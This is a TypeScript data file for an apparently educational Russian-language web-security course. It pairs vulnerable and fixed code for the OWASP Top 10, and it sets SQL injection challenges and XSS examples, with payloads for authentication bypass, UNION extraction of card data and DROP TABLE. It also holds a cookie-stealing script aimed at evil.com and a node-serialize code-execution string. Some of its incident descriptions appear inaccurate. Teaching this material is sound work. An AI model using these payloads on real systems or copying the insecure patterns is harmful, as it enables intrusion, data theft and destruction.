// ============================================================
// OWASP Top 10 (2021) — Educational Content in Russian
// ============================================================
export const owaspItems = [
  {
    id: 'a01',
    code: 'A01:2021',
    title: 'Сбой контроля доступа (Broken Access Control)',
    severity: 'Критический',
    severityColor: 'bg-red-500',
    description:
      'Сбои контроля доступа являются наиболее критической уязвимостью в веб-приложениях. Они возникают, когда пользователи могут получать доступ к данным или функциям, которые не должны быть им доступны. Это включает обход аутентификации, повышение привилегий, просмотр чужих данных и несанкционированное выполнение операций.',
    realExample:
      'В 2019 году исследователи обнаружили, что в популярном банковском приложении можно было изменить номер аккаунта в URL-адресе запроса и получить доступ к счетам других клиентов. Это позволило злоумышленникам просматривать балансы и совершать переводы от имени других пользователей, что привело к многомиллионным убыткам.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — отсутствие проверки прав доступа
app.get('/api/users/:id', (req, res) => {
  // Любой пользователь может запросить данные любого другого пользователя
  const user = db.findUser(req.params.id);
  res.json(user);
});

// УЯЗВИМЫЙ КОД — манипуляция ID в запросе
app.get('/api/orders/:orderId', (req, res) => {
  const order = db.findOrder(req.params.orderId);
  // Нет проверки, что заказ принадлежит текущему пользователю
  res.json(order);
});`,
    secureCode: `// БЕЗОПАСНЫЙ КОД — проверка прав доступа
app.get('/api/users/:id', (req, res) => {
  // Проверяем, что пользователь запрашивает только свои данные
  if (req.user.id !== req.params.id && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Доступ запрещён' });
  }
  const user = db.findUser(req.params.id);
  res.json(user);
});

// БЕЗОПАСНЫЙ КОД — использование токена авторизации
app.get('/api/orders/:orderId', (req, res) => {
  const order = db.findOrder(req.params.orderId);
  if (order.userId !== req.user.id) {
    return res.status(403).json({ error: 'Заказ не найден' });
  }
  res.json(order);
});`,
    mitigations: [
      'Реализуйте контроль доступа на серверной стороне (никогда не полагайтесь на клиент)',
      'Используйте принцип наименьших привилегий для всех ролей',
      'Запретите доступ к файлам по умолчанию (deny by default)',
      'Внедрите логирование и мониторинг несанкционированных попыток доступа',
      'Используйте идентификаторы сессии вместо прямых ID объектов',
    ],
  },
  {
    id: 'a02',
    code: 'A02:2021',
    title: 'Криптографические сбои (Cryptographic Failures)',
    severity: 'Критический',
    severityColor: 'bg-red-500',
    description:
      'Криптографические сбои возникают при неправильном использовании криптографии — слабое шифрование, отсутствие шифрования важных данных, использование устаревших алгоритмов или неправильное управление ключами. Ранее эта категория называлась «Раскрытие конфиденциальных данных» и затрагивает не только криптографию, но и общие проблемы с защитой данных.',
    realExample:
      'Один из крупнейших утечек данных произошёл в 2017 году, когда компания Equifax потеряла данные 147 миллионов человек. Причиной стало использование устаревшей версии Apache Struts с известной уязвимостью. Данные (номера карт, SSN) хранились в открытом виде без должной криптографической защиты, что усугубило последствия.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — хранение паролей в открытом виде
const user = {
  email: 'user@example.com',
  password: 'mypassword123',  // Хранится в plain text!
  creditCard: '4532-1234-5678-9012' // Нет шифрования
};

// УЯЗВИМЫЙ КОД — использование слабого хеширования
const crypto = require('crypto');
function hashPassword(password) {
  return crypto.createHash('md5').update(password).digest('hex');
  // MD5 — устаревший и ненадёжный алгоритм
}`,
    secureCode: `// БЕЗОПАСНЫЙ КОД — использование bcrypt
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;

async function hashPassword(password) {
  const salt = await bcrypt.genSalt(SALT_ROUNDS);
  return bcrypt.hash(password, salt);
}

async function verifyPassword(password, hash) {
  return bcrypt.compare(password, hash);
}

// БЕЗОПАСНОЕ хранение данных
const user = {
  email: 'user@example.com',
  passwordHash: '$2b$12$LJ3m4...hash',
  creditCard: encryptData(cardNumber, ENCRYPTION_KEY)
};`,
    mitigations: [
      'Используйте bcrypt или Argon2 для хеширования паролей',
      'Применяйте AES-256 для шифрования данных в покое',
      'Используйте TLS 1.3 для передачи данных',
      'Не храните пароли в открытом виде — только хеши',
      'Классифицируйте данные по уровню конфиденциальности',
    ],
  },
  {
    id: 'a03',
    code: 'A03:2021',
    title: 'Инъекции (Injection)',
    severity: 'Критический',
    severityColor: 'bg-red-500',
    description:
      'Инъекции — это класс уязвимостей, при которых недоверенные данные отправляются интерпретатору в составе команды или запроса. Наиболее распространённые виды: SQL-инъекции, NoSQL-инъекции, OS-инъекции, LDAP-инъекции. Злоумышленник может выполнить нежелательные команды или получить доступ к данным без соответствующих прав.',
    realExample:
      'В 2008 году атака SQL-инъекцией на корпоративную сеть Heartland Payment Systems позволила злоумышленникам украсть данные 130 миллионов кредитных карт. Атакующие использовали SQL-инъекцию в веб-форме для выполнения произвольных SQL-запросов к базе данных компании. Этот случай стал одним из самых масштабных краж финансовых данных.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — прямая подстановка в SQL
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const query = \`SELECT * FROM users
    WHERE username = '\${username}'
    AND password = '\${password}'\`;
  // Ввод: ' OR '1'='1' --
  // Итог: SELECT * FROM users WHERE username='' OR '1'='1' --
  db.query(query, (err, results) => {
    if (results.length > 0) res.json({ success: true });
  });
});`,
    secureCode: `// БЕЗОПАСНЫЙ КОД — параметризованные запросы
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const query = 'SELECT * FROM users WHERE username = ? AND password_hash = ?';
  // Параметры передаются отдельно — невозможна инъекция
  db.query(query, [username, passwordHash], (err, results) => {
    if (results.length > 0) res.json({ success: true });
  });
});

// Или с ORM (Prisma, Sequelize)
const user = await prisma.user.findUnique({
  where: { username }
});`,
    mitigations: [
      'Используйте параметризованные запросы или ORM',
      'Применяйте валидацию и санитизацию входных данных',
      'Используйте принцип наименьших привилегий для БД',
      'Внедрите WAF (Web Application Firewall)',
      'Тестируйте с помощью автоматизированных инструментов (SQLMap)',
    ],
  },
  {
    id: 'a04',
    code: 'A04:2021',
    title: 'Небезопасный дизайн (Insecure Design)',
    severity: 'Высокий',
    severityColor: 'bg-orange-500',
    description:
      'Небезопасный дизайн — это широкая категория уязвимостей, связанная с недостатками в архитектуре и проектировании приложения. В отличие от Implementation bugs, эти проблемы заложены на этапе проектирования и не могут быть решены простой модификацией кода. Примеры: отсутствие ограничений на частоту запросов, слабые бизнес-правила валидации, отсутствие управления состоянием.',
    realExample:
      'Многие системы онлайн-бронирования позволяют злоумышленникам бронировать товары без оплаты, блокируя их для реальных покупателей. Это происходит потому, что при проектировании не было предусмотрено ограничение по времени незавершённых бронирований и не была реализована система предварительной авторизации средств.',
    vulnerableCode: `// НЕБЕЗОПАСНЫЙ ДИЗАЙН — нет ограничений
app.post('/api/forgot-password', (req, res) => {
  // Нет лимита на количество запросов — можно перебрать коды
  // Нет верификации email перед сменой пароля
  sendResetCode(req.body.email);
  res.json({ message: 'Код отправлен' });
});

// Нет ограничения на количество попыток ввода OTP
app.post('/api/verify-otp', (req, res) => {
  if (req.body.code === storedCode) {
    resetPassword(req.body.email);
  }
});`,
    secureCode: `// БЕЗОПАСНЫЙ ДИЗАЙН — rate limiting + бизнес-логика
const rateLimit = require('express-rate-limit');

const otpLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 минут
  max: 5, // максимум 5 попыток
  message: 'Слишком много попыток. Попробуйте позже.'
});

app.post('/api/verify-otp', otpLimiter, (req, res) => {
  // Проверяем, что код не просрочен (10 минут)
  if (Date.now() - otpCreatedAt > 10 * 60 * 1000) {
    return res.status(400).json({ error: 'Код просрочен' });
  }
  // Верифицируем код
  if (req.body.code === storedCode) {
    resetPassword(req.body.email);
  }
});`,
    mitigations: [
      'Проводите анализ угроз на этапе проектирования (Threat Modeling)',
      'Внедряйте ограничение частоты запросов (Rate Limiting)',
      'Проектируйте безопасные бизнес-процессы с учётом злоупотреблений',
      'Используйтеstoryboarding и abuse cases',
      'Применяйте защищённые паттерны проектирования',
    ],
  },
  {
    id: 'a05',
    code: 'A05:2021',
    title: 'Ошибки безопасности (Security Misconfiguration)',
    severity: 'Высокий',
    severityColor: 'bg-orange-500',
    description:
      'Ошибки безопасности — это наиболее распространённая категория уязвимостей, вызванная некорректной конфигурацией приложений, серверов, фреймворков и библиотек. Это может включать включённые отладочные режимы в продакшене, открытые облачные хранилища, неиспользуемые функции по умолчанию, незащищённые заголовки HTTP и многое другое.',
    realExample:
      'В 2017 году исследователи обнаружили, что Defence.gc.ca — официальный сайт Министерства национальной обороны Канады — оставил открытым сервер Elasticsearch без пароля. Это позволило любому пользователю получить доступ к базам данных с конфиденциальной информацией, включая внутренние документы и учётные записи.',
    vulnerableCode: `// НЕБЕЗОПАСНАЯ КОНФИГУРАЦИЯ
const app = express();

// Заголовки безопасности отсутствуют
app.use(express.static('public'));
// Нет CORS
// Нет Helmet
// Отладка включена в продакшене
app.set('env', 'development');

// Развернутые на продакшене отладочные эндпоинты
app.get('/debug/routes', (req, res) => {
  res.json(app._router.stack); // Показывает все маршруты
});

app.get('/debug/env', (req, res) => {
  res.json(process.env); // Показывает переменные окружения!
});`,
    secureCode: `// БЕЗОПАСНАЯ КОНФИГУРАЦИЯ
const app = express();
const helmet = require('helmet');

// Защитные заголовки HTTP
app.use(helmet());
app.use(helmet.contentSecurityPolicy({
  directives: { defaultSrc: ["'self'"] }
}));

// Настройка CORS
const cors = require('cors');
app.use(cors({ origin: 'https://myapp.com' }));

// Отключение лишних заголовков
app.disable('x-powered-by');

// В продакшене — никакой отладки
if (process.env.NODE_ENV === 'production') {
  app.set('env', 'production');
  // Отладочные эндпоинты ТОЛЬКО в разработке
}`,
    mitigations: [
      'Используйте helmet.js для настройки заголовков безопасности',
      'Отключите отладку и ненужные эндпоинты в продакшене',
      'Применяйте минимальную конфигурацию (отключайте всё лишнее)',
      'Автоматизируйте проверку конфигурации через CI/CD',
      'Регулярно проводите аудит конфигурации серверов',
    ],
  },
  {
    id: 'a06',
    code: 'A06:2021',
    title: 'Уязвимые и устаревшие компоненты (Vulnerable Components)',
    severity: 'Высокий',
    severityColor: 'bg-orange-500',
    description:
      'Использование библиотек, фреймворков и других программных компонентов с известными уязвимостями — одна из самых распространённых проблем безопасности. Злоумышленники могут автоматически сканировать приложения на наличие известных уязвимых версий и эксплуатировать их с минимальными усилиями. Каждое приложение использует множество компонентов, и любой из них может быть уязвим.',
    realExample:
      'Уязвимость Log4Shell (CVE-2021-44228) в библиотеке Apache Log4j затронула миллионы приложений по всему миру. Уязвимость позволяла злоумышленникам выполнять произвольный код на сервере, отправляя специально сформированную строку в лог. Многие организации даже не знали, что используют Log4j, так как он был транзитивной зависимостью в их приложениях.',
    vulnerableCode: `// УЯЗВИМЫЕ ЗАВИСИМОСТИ в package.json
{
  "dependencies": {
    "lodash": "4.17.4",        // Уязвимость CVE-2021-23337
    "express": "4.16.0",       // Обнаружены уязвимости
    "jquery": "2.2.4",         // XSS уязвимости
    "minimist": "0.0.8"       // Prototype pollution
  }
}

// Без блокировки версий:
// "lodash": "^4.17.0" — может установить уязвимую версию
`,
    secureCode: `// БЕЗОПАСНОЕ управление зависимостями

// 1. Используйте точные или ranged версии с aware-интервалом
{
  "dependencies": {
    "lodash": "4.17.21",      // Последняя безопасная версия
    "express": "4.19.2",      // Актуальная версия
  }
}

// 2. Регулярный аудит через npm/bun
// bun audit
// npm audit --production

// 3. Используйте Snyk или Dependabot для мониторинга
// 4. Блокировка версий через lock-файлы (bun.lock)
// 5. Проверяйте лицензии зависимостей
`,
    mitigations: [
      'Регулярно обновляйте зависимости (минимум раз в месяц)',
      'Используйте `bun audit` или `npm audit` для проверки',
      'Настройте Dependabot или Snyk для автоматического мониторинга',
      'Удаляйте неиспользуемые зависимости',
      'Подпишитесь на Security Advisories используемых пакетов',
    ],
  },
  {
    id: 'a07',
    code: 'A07:2021',
    title: 'Ошибки идентификации и аутентификации',
    severity: 'Высокий',
    severityColor: 'bg-orange-500',
    description:
      'Ошибки идентификации и аутентификации возникают, когда функции подтверждения личности пользователя реализованы некорректно. Это позволяет злоумышленникам выдавать себя за других пользователей, обходить аутентификацию или использовать слабые механизмы проверки. Проблемы включают: permitByDefault, слабые пароли, отсутствие MFA, уязвимые механизмы восстановления пароля.',
    realExample:
      'В 2020 году исследователи обнаружили, что система входа крупного провайдера облачных услуг позволяла перебирать пароли без ограничений. Злоумышленники могли сделать до 100 попыток в минуту, что при наличии слабых паролей пользователей приводило к успешной компрометации аккаунтов. Для миллионов аккаунтов использовались пароли из топ-10000 самых популярных.',
    vulnerableCode: `// УЯЗВИМЫЙ МЕХАНИЗМ АУТЕНТИФИКАЦИИ
app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const user = db.findUser(email);
  // Нет ограничения на количество попыток!
  if (user && user.password === password) { // Plain text сравнение!
    res.json({ token: generateToken(user) });
  } else {
    res.status(401).json({ error: 'Неверные данные' });
  }
});

// Слабая функция восстановления пароля
app.post('/reset-password', (req, res) => {
  // 4-значный PIN — легко перебрать
  if (req.body.pin === storedPin) {
    resetPassword(req.body.email);
  }
});`,
    secureCode: `// БЕЗОПАСНАЯ АУТЕНТИФИКАЦИЯ
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Слишком много попыток входа'
});

app.post('/login', loginLimiter, async (req, res) => {
  const { email, password } = req.body;
  const user = await db.findUser(email);

  // Используем bcrypt для сравнения (с постоянным временем)
  if (user && await bcrypt.compare(password, user.passwordHash)) {
    // Генерируем токен с TTL
    const token = jwt.sign(
      { id: user.id, role: user.role },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );
    res.json({ token });
  } else {
    // Одинаковое сообщение для обоих случаев
    res.status(401).json({ error: 'Неверные учётные данные' });
  }
});`,
    mitigations: [
      'Реализуйте многофакторную аутентификацию (MFA)',
      'Используйте bcrypt/Argon2 для хранения паролей',
      'Внедрите ограничение попыток входа (Rate Limiting)',
      'Не раскрывайте информацию о существовании аккаунтов',
      'Используйте стандартные библиотеки аутентификации (NextAuth, Passport)',
    ],
  },
  {
    id: 'a08',
    code: 'A08:2021',
    title: 'Ошибки целостности и сериализации данных',
    severity: 'Средний',
    severityColor: 'bg-yellow-500',
    description:
      'Ошибки целостности данных связаны с ненадёжной десериализацией данных из ненадёжных источников. Это может привести к выполнению произвольного кода, подмене объектов или манипуляции логикой приложения. В новых архитектурах эта категория также включает CSRF, в котором десериализация может изменить данные на сервере от имени другого пользователя.',
    realExample:
      'В 2015 году уязвимость в библиотеке Apache Commons Collections позволяла злоумышленникам выполнить произвольный код через десериализацию Java-объектов. Эта уязвимость затронула множество приложений, включая WebLogic, WebSphere, JBoss и другие серверы приложений. Впоследствии аналогичные уязвимости были найдены в .NET (Json.NET) и Node.js (node-serialize).',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — прямая десериализация
const deserialize = require('node-serialize');

app.post('/api/data', (req, res) => {
  // Данные от пользователя десериализуются напрямую
  // Злоумышленник может внедрить IIFE: _$$ND_FUNC$$_function(){require('child_process').exec('whoami')}()
  const data = deserialize.unserialize(req.body.data);
  res.json({ result: processData(data) });
});

// УЯЗВИМЫЙ КОД — eval() на пользовательских данных
app.post('/api/calculate', (req, res) => {
  // Никогда не делайте так!
  const result = eval(req.body.expression);
  res.json({ result });
});`,
    secureCode: `// БЕЗОПАСНЫЙ КОД — Schema validation
const { z } = require('zod');

const DataSchema = z.object({
  name: z.string().max(100),
  age: z.number().int().positive().max(150),
  email: z.string().email(),
});

app.post('/api/data', (req, res) => {
  // Валидация через схему — безопасная десериализация
  const result = DataSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ errors: result.error });
  }
  res.json({ result: processData(result.data) });
});

// Для вычислений — используйте безопасные библиотеки
const math = require('mathjs');
const result = math.evaluate(sanitizedExpression);`,
    mitigations: [
      'Никогда не десериализуйте данные от ненадёжных источников напрямую',
      'Используйте JSON.parse() вместо кастомных десериализаторов',
      'Внедряйте валидацию схем (Zod, Joi, Yup)',
      'Используйте integrity checks (цифровые подписи)',
      'Избегайте eval() и аналогичных функций с пользовательским вводом',
    ],
  },
  {
    id: 'a09',
    code: 'A09:2021',
    title: 'Ошибки журналирования и мониторинга',
    severity: 'Средний',
    severityColor: 'bg-yellow-500',
    description:
      'Без надлежащего журналирования и мониторинга нарушения безопасности остаются незамеченными длительное время. Большинство успешных атак можно было предотвратить или минимизировать при наличии эффективной системы мониторинга и логирования. К сожалению, журналирование часто является послесловием при разработке и не получает должного внимания.',
    realExample:
      'Атака на Equifax в 2017 году оставалась незамеченной более 76 дней, несмотря на то, что инструменты мониторинга безопасности компании должны были обнаружить её. После инцидента выяснилось, что сертификат для одного из инструментов мониторинга SSL истёк 10 месяцами ранее. Если бы журналирование работало корректно, утечка данных 147 миллионов человек могла бы быть предотвращена.',
    vulnerableCode: `// НЕДОСТАТОЧНОЕ ЖУРНАЛИРОВАНИЕ
app.post('/login', (req, res) => {
  const user = authenticate(req.body);
  if (user) {
    // Нет записи об успешном входе
    res.json({ token: user.token });
  } else {
    // Нет записи о неуспешной попытке
    // Нет IP-адреса, User-Agent, timestamp
    res.status(401).json({ error: 'Ошибка' });
  }
});

// Логи без контекста
console.log('Login failed'); // Кем? Когда? Откуда?
console.error(err);          // Без stack trace
`,
    secureCode: `// БЕЗОПАСНОЕ ЖУРНАЛИРОВАНИЕ
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'security.log' }),
  ]
});

app.post('/login', (req, res) => {
  const ip = req.ip;
  const userAgent = req.get('user-agent');
  const user = authenticate(req.body);

  if (user) {
    logger.info('LOGIN_SUCCESS', {
      userId: user.id,
      ip,
      userAgent,
      timestamp: new Date().toISOString()
    });
    res.json({ token: user.token });
  } else {
    logger.warn('LOGIN_FAILURE', {
      email: req.body.email,
      ip,
      userAgent,
      timestamp: new Date().toISOString()
    });
    res.status(401).json({ error: 'Ошибка' });
  }
});`,
    mitigations: [
      'Логируйте все события аутентификации (успешные и неуспешные)',
      'Записывайте IP-адреса, User-Agent и временные метки',
      'Настройте автоматические алерты на подозрительную активность',
      'Используйте централизованную систему логирования (ELK, Splunk)',
      'Не логируйте конфиденциальные данные (пароли, токены, номера карт)',
    ],
  },
  {
    id: 'a10',
    code: 'A10:2021',
    title: 'Подделка запросов на стороне сервера (SSRF)',
    severity: 'Средний',
    severityColor: 'bg-yellow-500',
    description:
      'SSRF-уязвимости возникают, когда серверное приложение делает HTTP-запросы к указанному пользователем URL без должной проверки. Злоумышленник может заставить сервер запрашивать внутренние ресурсы, облачные метаданные или внутренние API, к которым у него нет прямого доступа. Это особенно опасно в облачных средах, где метаданные экземпляров содержат учётные данные.',
    realExample:
      'В 2019 году исследователи обнаружили SSRF-уязвимость в Capital One, которая позволила злоумышленнице получить доступ к метаданным AWS EC2-инстанса через запрос к внутреннему IP-адресу 169.254.169.254. Это позволило ей получить временные IAM-учётные данные и получить доступ к базам данных S3 с персональными данными 106 миллионов клиентов Capital One.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — SSRF
app.get('/api/fetch-url', async (req, res) => {
  const { url } = req.query;
  // Сервер делает запрос к любому URL без проверки
  const response = await fetch(url);
  const data = await response.text();
  res.send(data);
  // Атака: /api/fetch-url?url=http://169.254.169.254/latest/meta-data/
  // Возвращает метаданные AWS с учётными данными!
});

// УЯЗВИМЫЙ КОД — загрузка изображений
app.post('/api/proxy-image', async (req, res) => {
  // Нет валидации URL — можно запросить внутренние ресурсы
  const image = await fetch(req.body.imageUrl);
  const buffer = await image.buffer();
  res.set('Content-Type', 'image/png');
  res.send(buffer);
});`,
    secureCode: `// БЕЗОПАСНЫЙ КОД — валидация URL
const { URL } = require('url');

const ALLOWED_DOMAINS = ['images.example.com', 'cdn.example.com'];
const BLOCKED_HOSTS = ['169.254.169.254', 'localhost', '127.0.0.1'];

app.get('/api/fetch-url', async (req, res) => {
  try {
    const parsedUrl = new URL(req.query.url);

    // Проверяем протокол
    if (!['https:'].includes(parsedUrl.protocol)) {
      return res.status(400).json({ error: 'Только HTTPS разрешён' });
    }

    // Проверяем домен
    if (!ALLOWED_DOMAINS.includes(parsedUrl.hostname)) {
      return res.status(400).json({ error: 'Домен не разрешён' });
    }

    // Проверяем на заблокированные хосты
    if (BLOCKED_HOSTS.includes(parsedUrl.hostname)) {
      return res.status(403).json({ error: 'Доступ запрещён' });
    }

    const response = await fetch(parsedUrl.href);
    res.send(await response.text());
  } catch {
    res.status(400).json({ error: 'Некорректный URL' });
  }
});`,
    mitigations: [
      'Используйте белый список разрешённых доменов',
      'Запретите запросы к внутренним IP-адресам и localhost',
      'Используйте только HTTPS для исходящих запросов',
      'Настройте network policies для ограничения исходящего трафика',
      'Внедрите проверку URL на этапе разбора (до выполнения запроса)',
    ],
  },
];

// ============================================================
// SQL Injection Challenges
// ============================================================
export const sqlChallenges = [
  {
    id: 'beginner-1',
    level: 'Новичок',
    title: 'Обход аутентификации',
    description: 'Войдите в систему без знания реального пароля, используя SQL-инъекцию в форме логина.',
    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'\n  AND password = 'password123'`,
    hint: 'Попробуйте закрыть строку с помощью одинарной кавычки и добавить условие, которое всегда истинно.',
    exampleInput: "' OR '1'='1",
    explanation:
      'Ввод \\\' OR \\\'1\\\'=\\\'1 закрывает строку username и добавляет условие OR \\\'1\\\'=\\\'1\\\', которое всегда истинно. Это превращает запрос в: SELECT * FROM users WHERE username=\\\'\\\' OR \\\'1\\\'=\\\'1\\\' AND password=\\\'password123\\\'. Благодаря приоритету оператора AND, условие OR \\\'1\\\'=\\\'1\\\' оценивается первым, возвращая все строки.',
    successQuery: `SELECT * FROM users\nWHERE username = '' OR '1'='1'\n  AND password = 'password123'`,
  },
  {
    id: 'beginner-2',
    level: 'Новичок',
    title: 'Комментарий для обхода',
    description: 'Обойдите проверку пароля, используя SQL-комментарий для игнорирования оставшейся части запроса.',
    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'\n  AND password = 'any'`,
    hint: 'Используйте символы -- (двойной дефис) для комментирования части запроса с паролем.',
    exampleInput: "admin'--",
    explanation:
      'Ввод admin\\\'-- закрывает строку username, а -- превращает всё после в комментарий. Запрос становится: SELECT * FROM users WHERE username=\\\'admin\\\'-- AND password=\\\'any\\\'. Часть с паролем полностью игнорируется, и запрос возвращает данные пользователя admin.',
    successQuery: `SELECT * FROM users\nWHERE username = 'admin'--\n  AND password = 'any'`,
  },
  {
    id: 'advanced-1',
    level: 'Продвинутый',
    title: 'Извлечение данных через UNION',
    description: 'Используйте UNION SELECT для извлечения данных из таблицы credit_cards.',
    initialQuery: `SELECT name, email FROM users\nWHERE name LIKE '%[ВВОД]%'`,
    hint: 'Закройте LIKE-выражение и добавьте UNION SELECT для выборки из другой таблицы. Количество столбцов должно совпадать.',
    exampleInput: "' UNION SELECT card_number, cvv FROM credit_cards--",
    explanation:
      'UNION объединяет результаты двух SELECT-запросов. Количество столбцов должно быть одинаковым. Комментарий -- скрывает остаток оригинального запроса. Результат: SELECT name, email FROM users WHERE name LIKE \\\'\\\' UNION SELECT card_number, cvv FROM credit_cards--%. Это возвращает данные о кредитных картах вместе с обычными результатами.',
    successQuery: `SELECT name, email FROM users\nWHERE name LIKE '%' UNION SELECT card_number, cvv FROM credit_cards--%'`,
  },
  {
    id: 'expert-1',
    level: 'Эксперт',
    title: 'Уничтожение данных (DROP TABLE)',
    description: 'Используйте инъекцию для выполнения деструктивной операции — удалите таблицу.',
    initialQuery: `SELECT * FROM products\nWHERE id = [ВВОД]`,
    hint: 'Закройте числовое значение и добавьте точку с запятой для нового SQL-оператора.',
    exampleInput: "1; DROP TABLE products;--",
    explanation:
      'Точка с запятой позволяет выполнить несколько SQL-операторов в одном запросе. Ввод 1; DROP TABLE products;-- сначала выполняет SELECT, а затем DROP TABLE. Этот тип атаки особенно опасен, так как приводит к полной потере данных. Многие СУБД предотвращают множественные запросы, но не все.',
    successQuery: `SELECT * FROM products\nWHERE id = 1; DROP TABLE products;--`,
  },
];

// ============================================================
// XSS Types
// ============================================================
export const xssTypes = [
  {
    id: 'reflected',
    title: 'Отражённый XSS (Reflected XSS)',
    description:
      'Отражённый XSS возникает, когда вредоносный скрипт встраивается в ответ сервера как результат запроса, содержащего внедрённый код. Скрипт «отражается» от сервера к пользователю через URL-параметры, формы или заголовки.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД -->
<div>
  Результаты поиска для:
  <span id="search-result"></span>
</div>

<script>
  // Ввод пользователя вставляется напрямую без санитизации
  document.getElementById('search-result').innerHTML =
    new URLSearchParams(location.search).get('q');
  // Атака: ?q=<script>alert('XSS')</script>
  // Или: ?q=<img src=x onerror=alert('XSS')>
</script>`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД -->
<div>
  Результаты поиска для:
  <span id="search-result"></span>
</div>

<script>
  // Используем textContent вместо innerHTML
  const query = new URLSearchParams(location.search).get('q');
  document.getElementById('search-result').textContent = query;

  // Или с серверной санитизацией (Node.js)
  const escapeHTML = (str) => str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
</script>`,
    attackDemo: '<script>alert("XSS-атака выполнена!")</script>',
    mitigation: 'Используйте textContent вместо innerHTML, кодируйте спецсимволы, применяйте Content Security Policy (CSP).',
  },
  {
    id: 'stored',
    title: 'Хранимый XSS (Stored XSS)',
    description:
      'Хранимый XSS — наиболее опасный тип, при котором вредоносный скрипт сохраняется на сервере (в базе данных, логах, комментариях) и выполняется при каждом отображении страницы. В отличие от отражённого XSS, жертве не нужно переходить по специальной ссылке — достаточно просто открыть страницу.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД —评论区 -->
<div class="comments">
  <!-- Комментарии из базы данных -->
  <div class="comment">
    <strong>Пользователь</strong>
    <p>{{comment.text}}</p>
    <!-- Если в comment.text содержится:
         <script>stealCookies()</script>
         Он будет выполнен для КАЖДОГО посетителя!
    -->
  </div>
</div>

<!-- Express.js backend -->
app.post('/api/comments', (req, res) => {
  // Сохраняем комментарий без санитизации
  db.query('INSERT INTO comments (text) VALUES (?)',
    [req.body.text]);
});`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД -->
<div class="comments">
  <div class="comment">
    <strong>Пользователь</strong>
    <!-- Используем HTML-кодирование -->
    <p>{{escapeHTML(comment.text)}}</p>
  </div>
</div>

<!-- Backend с санитизацией -->
const DOMPurify = require('dompurify');
app.post('/api/comments', (req, res) => {
  // Санитизируем HTML перед сохранением
  const cleanText = DOMPurify.sanitize(req.body.text, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  });
  db.query('INSERT INTO comments (text) VALUES (?)', [cleanText]);
});`,
    attackDemo: '<script>document.location="https://evil.com/steal?cookie="+document.cookie</script>',
    mitigation: 'Санитизируйте ввод перед сохранением в БД. Используйте DOMPurify для очистки HTML. Применяйте CSP заголовки.',
  },
  {
    id: 'dom',
    title: 'DOM-based XSS',
    description:
      'DOM-based XSS возникает, когда уязвимость находится в клиентском JavaScript-коде, который модифицирует DOM-дерево на основе данных из ненадёжного источника. В отличие от отражённого и хранимого XSS, вредоносный код вообще не отправляется на сервер — вся атака происходит в браузере.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — на стороне клиента
// Чтение данных из location.hash (фрагмента URL)
const userInput = location.hash.substring(1);

// Опасно — вставка HTML через innerHTML
document.getElementById('welcome').innerHTML =
  'Добро пожаловать, ' + userInput + '!';

// Атака: #<img src=x onerror=alert('XSS')>
// Результат: <div id="welcome">
//   Добро пожаловать, <img src=x onerror=alert('XSS')>!
// </div>

// Другие опасные источники:
// - document.referrer
// - document.cookie
// - window.name
// - localStorage/sessionStorage
// - postMessage`,
    secureCode: `// БЕЗОПАСНЫЙ КОД
const userInput = location.hash.substring(1);

// Вариант 1: Использовать textContent
document.getElementById('welcome').textContent =
  'Добро пожаловать, ' + userInput + '!';

// Вариант 2: Кодирование спецсимволов
function escapeHTML(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

document.getElementById('welcome').innerHTML =
  'Добро пожаловать, ' + escapeHTML(userInput) + '!';

// Вариант 3: Использовать URI-кодирование
const safeInput = decodeURIComponent(userInput);
// Всегда валидируйте входные данные!`,
    attackDemo: '#<img src=x onerror="document.body.style.background=\'red\'">',
    mitigation: 'Используйте textContent, а не innerHTML. Кодируйте данные из location.hash, document.referrer и других клиентских источников.',
  },
];

// ============================================================
// Quiz Questions
// ============================================================
export interface QuizQuestion {
  id: string;
  category: string;
  question: string;
  options: string[];
  correctIndex: number;
  explanation: string;
}

export const quizQuestions: QuizQuestion[] = [
  // SQL Injection
  {
    id: 'sql-1',
    category: 'SQL-инъекции',
    question: 'Какой метод лучше всего защищает от SQL-инъекций?',
    options: [
      'Фильтрация спецсимволов на клиенте',
      'Параметризованные запросы (prepared statements)',
      'Использование HTTPS',
      'Скрытие названий таблиц',
    ],
    correctIndex: 1,
    explanation:
      'Параметризованные запросы разделяют SQL-код и данные, что полностью исключает возможность инъекции. Данные передаются как параметры и не могут изменить структуру запроса, даже если содержат SQL-команды.',
  },
  {
    id: 'sql-2',
    category: 'SQL-инъекции',
    question: 'Что делает ввод "\\\' OR \\\'1\\\'=\\\'1" в форме логина?',
    options: [
      'Создаёт нового пользователя',
      'Заставляет условие WHERE быть всегда истинным',
      'Удаляет таблицу пользователей',
      'Блокирует доступ к базе данных',
    ],
    correctIndex: 1,
    explanation:
